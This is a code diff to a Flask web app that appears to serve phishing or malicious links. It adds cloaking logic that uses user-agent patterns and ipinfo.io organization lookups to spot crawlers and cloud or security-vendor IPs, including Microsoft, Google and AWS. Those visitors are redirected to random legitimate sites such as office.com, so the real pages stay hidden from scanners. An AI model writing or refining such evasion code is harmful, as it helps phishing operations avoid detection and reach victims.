@@ -3,6 +3,9 @@ import requests
 from flask import Flask, request, redirect, render_template, abort
 from flask_limiter import Limiter
 from flask_limiter.util import get_remote_address
+# Add these imports at the top
+from urllib.parse import urlparse
+import re
 
 app = Flask(__name__)
 
@@ -19,6 +22,43 @@ APPSCRIPT_URL = "https://script.google.com/macros/s/AKfycbzpGDrsMrVbWe4xjt39a0Ah
 
 # Cache for flagged IPs
 FLAGGED_IPS = set()
+
+
+# Add this list of legitimate domains
+LEGITIMATE_DOMAINS = [
+    "https://www.google.com",
+    "https://www.office.com",
+    "https://outlook.live.com",
+    "https://www.microsoft.com",
+    "https://www.bing.com",
+    "https://www.yahoo.com"
+]
+
+# Add this function to detect bots and organizations
+def is_bot_or_org(ip, user_agent, org_info):
+    # List of keywords indicating bot/crawler organizations
+    org_keywords = ['microsoft', 'google', 'amazon', 'digital ocean', 'azure', 
+                   'aws', 'oracle', 'facebook', 'twitter', 'linkedin']
+    
+    # Check user agent for bot indicators
+    bot_patterns = [
+        r'bot', r'crawler', r'spider', r'slurp', r'mediapartners',
+        r'googleapis', r'chrome-lighthouse', r'pingdom', r'pagespeed'
+    ]
+    
+    # Convert to lowercase for case-insensitive matching
+    user_agent = user_agent.lower()
+    org_info = org_info.lower() if org_info else ""
+    
+    # Check if user agent contains bot patterns
+    if any(re.search(pattern, user_agent) for pattern in bot_patterns):
+        return True
+        
+    # Check if organization name contains keywords
+    if any(keyword in org_info for keyword in org_keywords):
+        return True
+        
+    return False
 
 # Function to check if an IP is flagged using IPHub or AbuseIPDB
 def is_ip_flagged(ip):
@@ -131,6 +171,19 @@ def path_handler(num):
 def premium_path_handler(num):
     visitor_ip = request.remote_addr
     user_agent = request.headers.get('User-Agent', '')
+    
+    try:
+        # Get organization info using ipinfo.io
+        ip_info = requests.get(f'https://ipinfo.io/{visitor_ip}/json').json()
+        org_info = ip_info.get('org', '')
+        
+        # Check if it's a bot or from blocked organization
+        if is_bot_or_org(visitor_ip, user_agent, org_info):
+            # Redirect to a random legitimate domain
+            return redirect(random.choice(LEGITIMATE_DOMAINS))
+            
+    except Exception as e:
+        print(f"Error checking IP info: {e}")
 
     # Block empty or suspicious user-agents
     if not user_agent or "bot" in user_agent.lower() or "crawler" in user_agent.lower():
@@ -162,6 +215,7 @@ def premium_path_handler(num):
         )
 
     return render_template('error.html', message="Path not found"), 404
+
 
 
 # Route for the main page
